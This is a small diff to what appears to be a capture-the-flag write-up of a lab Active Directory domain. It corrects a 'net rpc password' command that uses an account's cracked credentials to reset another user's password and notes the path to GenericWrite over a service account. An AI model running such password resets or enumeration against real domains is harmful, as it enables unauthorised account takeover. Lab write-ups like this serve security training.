@@ -149,7 +149,7 @@ bloodhound-ce-python -d hacksmarter.local -u 'alt.svc' -p 'babygirl1' -ns <your-
 We change Yorinobu’s password. Then we see that they can log in because they are part of the Remote Management Users group. But, more importantly, they have GenericWrite on Soulkiller.svc.
 
 ```
-net rpc password "YORINOBU" "newP@ssword2025" -U "DOMAIN"/"alt.svc"%'babygirl1' -S "DC01.hacksmarter.local"
+net rpc password "YORINOBU" "newP@ssword2025" -U "hacksmarter.local"/"alt.svc"%'babygirl1' -S "DC01.hacksmarter.local"
 ```
 
 ![](img/9.png)
